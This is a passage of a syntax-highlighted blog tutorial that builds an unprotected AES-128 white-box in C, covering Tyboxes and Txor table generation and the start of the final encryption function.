class="n">aa</span> <span class="o">&gt;&gt;</span>  <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">][(</span><span class="n">bb</span> <span class="o">&gt;&gt;</span>  <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">]][</span><span class="n">Txor</span><span class="p">[(</span><span class="n">cc</span> <span class="o">&gt;&gt;</span>  <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">][(</span><span class="n">dd</span> <span class="o">&gt;&gt;</span>  <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">]])</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">);</span>
</span><span class='line'>            <span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">Txor</span><span class="p">[</span><span class="n">Txor</span><span class="p">[(</span><span class="n">aa</span> <span class="o">&gt;&gt;</span>  <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">][(</span><span class="n">bb</span> <span class="o">&gt;&gt;</span>  <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">]][</span><span class="n">Txor</span><span class="p">[(</span><span class="n">cc</span> <span class="o">&gt;&gt;</span>  <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">][(</span><span class="n">dd</span> <span class="o">&gt;&gt;</span>  <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">]])</span>  <span class="o">|</span> <span class="p">((</span><span class="n">Txor</span><span class="p">[</span><span class="n">Txor</span><span class="p">[(</span><span class="n">aa</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">][(</span><span class="n">bb</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">]][</span><span class="n">Txor</span><span class="p">[(</span><span class="n">cc</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">][(</span><span class="n">dd</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">]])</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">);</span>
</span><span class='line'>            <span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">Txor</span><span class="p">[</span><span class="n">Txor</span><span class="p">[(</span><span class="n">aa</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">][(</span><span class="n">bb</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">]][</span><span class="n">Txor</span><span class="p">[(</span><span class="n">cc</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">][(</span><span class="n">dd</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">]])</span>  <span class="o">|</span> <span class="p">((</span><span class="n">Txor</span><span class="p">[</span><span class="n">Txor</span><span class="p">[(</span><span class="n">aa</span> <span class="o">&gt;&gt;</span> <span class="mi">20</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">][(</span><span class="n">bb</span> <span class="o">&gt;&gt;</span> <span class="mi">20</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">]][</span><span class="n">Txor</span><span class="p">[(</span><span class="n">cc</span> <span class="o">&gt;&gt;</span> <span class="mi">20</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">][(</span><span class="n">dd</span> <span class="o">&gt;&gt;</span> <span class="mi">20</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">]])</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">);</span>
</span><span class='line'>            <span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">Txor</span><span class="p">[</span><span class="n">Txor</span><span class="p">[(</span><span class="n">aa</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">][(</span><span class="n">bb</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">]][</span><span class="n">Txor</span><span class="p">[(</span><span class="n">cc</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">][(</span><span class="n">dd</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">]])</span>  <span class="o">|</span> <span class="p">((</span><span class="n">Txor</span><span class="p">[</span><span class="n">Txor</span><span class="p">[(</span><span class="n">aa</span> <span class="o">&gt;&gt;</span> <span class="mi">28</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">][(</span><span class="n">bb</span> <span class="o">&gt;&gt;</span> <span class="mi">28</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">]][</span><span class="n">Txor</span><span class="p">[(</span><span class="n">cc</span> <span class="o">&gt;&gt;</span> <span class="mi">28</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">][(</span><span class="n">dd</span> <span class="o">&gt;&gt;</span> <span class="mi">28</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">]])</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">/// Last round which is a bit different</span>
</span><span class='line'>    <span class="n">ShiftRows</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">x</span> <span class="o">=</span> <span class="n">Tboxes</span><span class="p">[</span><span class="mi">9</span><span class="p">][</span><span class="n">j</span><span class="p">][</span><span class="n">out</span><span class="p">[</span><span class="n">j</span><span class="p">]];</span>
</span><span class='line'>        <span class="n">out</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">x</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Step 7: Combining TBoxes &amp; Ty tables</h2>

<p>The last step aims to combine the <code>Tboxes</code> with <code>Ty</code> tables and if you look at the code it doesn&rsquo;t seem really hard. We basically want the table to work this way: 1 byte as input (<code>a</code> for example in the previous code) &amp; generate 4 bytes of outputs.</p>

<p>To compute such a table, you need to compute the <code>Tboxes</code> (or not, you can compute everything without relying on the <code>Tboxes</code> ; it&rsquo;s actually what I&rsquo;m doing), &amp; then you compute <code>Ty[Y][Tboxes[i][j][X]]</code> ; this is it, roughly. <code>X</code>, <code>i</code> and <code>j</code> are the unknown variables here, which means we will end-up with a table like that:</p>

<figure class='code'><figcaption><span>Tyboxes</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">Tyboxes</span><span class="p">[</span><span class="mi">9</span><span class="p">][</span><span class="mi">16</span><span class="p">][</span><span class="mh">0x100</span><span class="p">];</span>
</span></code></pre></td></tr></table></div></figure>


<p>Makes sense right?</p>

<p>So here is the code that generates that big table:</p>

<figure class='code'><figcaption><span>wbaes128_unprotected_tables_generator.c:Tyboxes table generation</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'><span class="p">[...]</span>
</span><span class='line'>    <span class="c1">/// Tyboxes</span>
</span><span class='line'>    <span class="c1">/// It&#39;s basically Tybox(Tboxes(x))</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">Tyboxes</span><span class="p">[</span><span class="mi">9</span><span class="p">][</span><span class="mi">16</span><span class="p">][</span><span class="mh">0x100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;const unsigned int Tyboxes[9][16][0x100] =</span><span class="se">\n</span><span class="s">{</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">r</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">r</span> <span class="o">&lt;</span> <span class="mi">9</span><span class="p">;</span> <span class="o">++</span><span class="n">r</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;  {</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="c1">// ShiftRows(round_keys[r]); &lt;- don&#39;t forget we already executed that to compute the Tboxes</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;    {</span><span class="se">\n</span><span class="s">      &quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">x</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">;</span> <span class="o">++</span><span class="n">x</span><span class="p">)</span>
</span><span class='line'>            <span class="p">{</span>
</span><span class='line'>                <span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">x</span> <span class="o">%</span> <span class="mi">16</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>                    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">      &quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>                <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">c</span> <span class="o">=</span> <span class="n">S_box</span><span class="p">[</span><span class="n">x</span> <span class="o">^</span> <span class="n">round_keys</span><span class="p">[</span><span class="n">r</span><span class="p">][</span><span class="n">i</span><span class="p">]];</span>
</span><span class='line'>                <span class="n">Tyboxes</span><span class="p">[</span><span class="n">r</span><span class="p">][</span><span class="n">i</span><span class="p">][</span><span class="n">x</span><span class="p">]</span> <span class="o">=</span> <span class="n">Ty</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">4</span><span class="p">][</span><span class="n">c</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;0x%.8x&quot;</span><span class="p">,</span> <span class="n">Tyboxes</span><span class="p">[</span><span class="n">r</span><span class="p">][</span><span class="n">i</span><span class="p">][</span><span class="n">x</span><span class="p">]);</span>
</span><span class='line'>                <span class="k">if</span> <span class="p">((</span><span class="n">x</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">)</span>
</span><span class='line'>                    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;, &quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">    }&quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="k">if</span> <span class="p">((</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;,&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;  }&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">((</span><span class="n">r</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span>
</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;,&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;};</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;const unsigned char Tboxes_[16][0x100] = </span><span class="se">\n</span><span class="s">{</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;  {</span><span class="se">\n</span><span class="s">    &quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">x</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">;</span> <span class="o">++</span><span class="n">x</span><span class="p">)</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">x</span> <span class="o">%</span> <span class="mi">16</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">    &quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">Tboxes</span><span class="p">[</span><span class="mi">9</span><span class="p">][</span><span class="n">i</span><span class="p">][</span><span class="n">x</span><span class="p">]</span> <span class="o">=</span> <span class="n">S_box</span><span class="p">[</span><span class="n">x</span> <span class="o">^</span> <span class="n">round_keys</span><span class="p">[</span><span class="mi">9</span><span class="p">][</span><span class="n">i</span><span class="p">]]</span> <span class="o">^</span> <span class="n">round_keys</span><span class="p">[</span><span class="mi">10</span><span class="p">][</span><span class="n">i</span><span class="p">];</span>
</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;0x%.2x&quot;</span><span class="p">,</span> <span class="n">Tboxes</span><span class="p">[</span><span class="mi">9</span><span class="p">][</span><span class="n">i</span><span class="p">][</span><span class="n">x</span><span class="p">]);</span>
</span><span class='line'>            <span class="k">if</span> <span class="p">((</span><span class="n">x</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">)</span>
</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;, &quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">  }&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">((</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;,&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;};</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>We just have to take care of the last round which is a bit different as we saw earlier, but no biggie.</p>

<h2>Final code</h2>

<p>Yeah, finally, here we are ; the final code of our (not protected) AES128 white-box:</p>

<figure class='code'><figcaption><span>aes128_enc_wb_final</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">aes128_enc_wb_final</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">in</span><span class="p">[</span><span class="mi">16</span><span class="p">],</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">out</span><span class="p">[</span><span class="mi">16</span><span class="p">])</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">memcpy</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">in</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">/// Let&#39;s start the encryption process now</span>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">9</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">ShiftRows</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">)</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">aa</span> <span class="o">=</span> <span class="n">Tyboxes</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">0</span><span class="p">][</span><span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">0</span><span class="p">]];</span>
</span><span class='line'>            <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">bb</span> <span class="o">=</span> <span class="n">Tyboxes</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">1</span><span class="p">][</span><span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]];</span>
</span><span class='line'>            <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cc</span> <span class="o">=</span> <span class="n">Tyboxes</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">2</span><span class="p">][</span><span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]];</span>
</span><span class='line'>            <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">dd</span> <span class="o">=</span> <span class="n">Tyboxes</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">3</span><span class="p">][</span><span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">3</span><span class="p">]];</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">Txor</span><span class="p">[</span><span class="n">Txor</span><span class="p">[(</span><span class="n">aa</span> <span class="o">&gt;&gt;</span>  <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">][(</span><span class="n">bb</span> <span class="o">&gt;&gt;</span>  <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">]][</span><span class="n">Txor</span><span class="p">[(</span><span class="n">cc</span> <span class="o">&gt;&gt;</span>  <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">][(</span><span class="n">dd</span> <span class="o">&gt;&gt;</span>  <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">]])</span> <span class="o">|</span> <span class="p">((</span><span class="n">Txor</span><span class="p">[</span><span class="n">Txor</span><span class="p">[(</span><span class="n">aa</span> <span class="o">&gt;&gt;</span>  <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">][(</span><span class="n">bb</span> <span class="o">&gt;&gt;</span>  <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">]][</span><span class="n">Txor</span><span class="p">[(</span><span class="n">cc</span> <span class="o">&gt;&gt;</span>  <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">][(</span><span class="n">dd</span> <span class="o">&gt;&gt;</span>  <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">]])</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">);</span>
</span><span class='line'>            <span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">Txor</span><span class="p">[</span><span class="n">Txor</span><span class="p">[(</span><span class="n">aa</span> <span class="o">&gt;&gt;</span>  <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">][(</span><span class="n">bb</span> <span class="o">&gt;&gt;</span>  <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">]][</span><span class="n">Txor</span><span class="p">[(</span><span class="n">cc</span> <span class="o">&gt;&gt;</span>  <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">][(</span><span class="n">dd</span> <span class="o">&gt;&gt;</span>  <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">]])</span> <span class="o">|</span> <span class="p">((</span><span class="n">Txor</span><span class="p">[</span><span class="n">Txor</span><span class="p">[(</span><span class="n">aa</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">][(</span><span class="n">bb</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">]][</span><span class="n">Txor</span><span class="p">[(</span><span class="n">cc</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">][(</span><span class="n">dd</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">]])</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">);</span>
</span><span class='line'>            <span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">Txor</span><span class="p">[</span><span class="n">Txor</span><span class="p">[(</span><span class="n">aa</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">][(</span><span class="n">bb</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">]][</span><span class="n">Txor</span><span class="p">[(</span><span class="n">cc</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">][(</span><span class="n">dd</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">]])</span> <span class="o">|</span> 